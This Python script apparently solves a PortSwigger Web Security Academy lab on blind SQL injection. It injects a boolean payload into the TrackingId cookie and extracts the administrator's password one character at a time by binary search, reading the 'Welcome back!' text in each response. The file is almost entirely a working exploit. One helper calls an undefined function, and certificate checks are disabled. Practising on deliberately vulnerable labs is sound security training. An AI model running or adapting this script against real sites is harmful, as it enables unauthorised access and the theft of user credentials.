import requests
from bs4 import BeautifulSoup
from string import ascii_lowercase, digits
import urllib3


# чтобы не выводила предупреждение
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


arr_digits_letters = list(digits + ascii_lowercase)

headers = {'user-agent': 
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chromium/80.0.3987.160 Chrome/80.0.3987.163 Safari/537.36'
 }

login_data = {
    'username': 'administrator',
    'password': '123',
}

url = 'https://acef1f731f61eb44c06a71be005c00bc.web-security-academy.net/login'



def define_variables():
    return 0, len(arr_digits_letters) - 1, (0 + len(arr_digits_letters) - 1) // 2, "=", 1, ""


def get_cookie_and_csrf_token(cookie_name: str) -> tuple:
        s = requests.Session()
        r = s.get(url, headers=headers, verify=False)
        original_cookies = s.cookies.get(cookie_name)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrfToken = soup.find('input', attrs={'name': 'csrf'})['value']
        return (original_cookies, csrfToken, s)



def send_post_request(login_data: dict, headers: dict, cookies: dict, session) -> str:
    r = session.post(url, data=login_data, headers=headers, cookies=cookies)
    soup = BeautifulSoup(r.content, 'html.parser')
    html_unswer = soup.prettify()
    session.close()
    return html_unswer



def binary_search(arr: list, n: int):
    low = 0
    high = len(arr) - 1
    while low <= high:
        middle = (low + high) // 2
        if send_request("=", arr[middle], n):
            return arr[middle]
        if send_request("<", arr[middle], n):
            high = middle - 1
        else:
            low = middle + 1
    
    return None


def modified_cookies(cookies: str, sql_command: str):
    modified_cookies = cookies + sql_command
    return dict(TrackingId=modified_cookies)


def check_html_code(find_string: str, sql_command: str, cookie_name: str) -> bool:
    cookie, csrfToken, session = get_cookie_and_csrf_token(cookie_name)
    mod_cookie = modified_cookies(cookie, sql_command)
    login_data['csrf'] = csrfToken

    html_code = send_post_request(login_data=login_data, headers=headers, cookies=mod_cookie, session=session)
    # print(html_code)
    if find_string in html_code:
            return True
    return False  


def sql_command(operator, n_sim_of_pass, simbol) -> str:
    return f"'  AND (SELECT SUBSTRING(password,{n_sim_of_pass},1) FROM users WHERE username='administrator'){operator}'{simbol}"


if __name__ == "__main__":
    low, high, middle, operator, n_sim_of_pass, password_user = define_variables()
    while low <= high:

        if check_html_code(find_string="Welcome back!",
         sql_command=sql_command(operator, n_sim_of_pass, arr_digits_letters[middle]), 
         cookie_name="TrackingId"):
        
            password_user += arr_digits_letters[middle]
            print(f"Found half of password: {password_user}")
            n_sim_of_pass += 1
            low, high, middle, *_ = define_variables()
            continue

        operator = "<"
        if check_html_code(find_string="Welcome back!",
          sql_command=sql_command(operator, n_sim_of_pass, arr_digits_letters[middle]),
          cookie_name="TrackingId"):
            high = middle - 1
        else:
            low = middle + 1
        
        middle = (low + high) // 2
        operator = "="

    print(f"\n\n\n\npassword: ({password_user})")
